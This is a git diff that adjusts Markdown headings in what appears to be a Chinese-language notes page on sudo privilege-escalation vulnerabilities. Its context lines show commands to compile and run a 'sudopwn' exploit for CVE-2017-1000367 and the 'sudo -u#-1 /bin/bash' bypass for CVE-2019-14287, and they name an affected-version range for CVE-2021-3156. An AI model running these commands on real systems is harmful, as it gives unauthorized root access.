@@ -28,7 +28,7 @@ cd sudo-CVE-2017-1000367
 gcc -o sudopwn sudopwn.c -lutil
 ./sudopwn
 ```
-## CVE-2019-14287
+### CVE-2019-14287
  
 ```
 $ sudo -u#-1 /bin/bash
@@ -36,7 +36,7 @@ $ sudo -u#-1 /bin/bash
 $ sudo -u#4294967295 /bin/bash
 ```
 
-# ## CVE-2021-3156
+### CVE-2021-3156
 基于堆的缓冲区溢出漏洞
 受影响版本
 Sudo 1.8.2 - 1.8.31p2
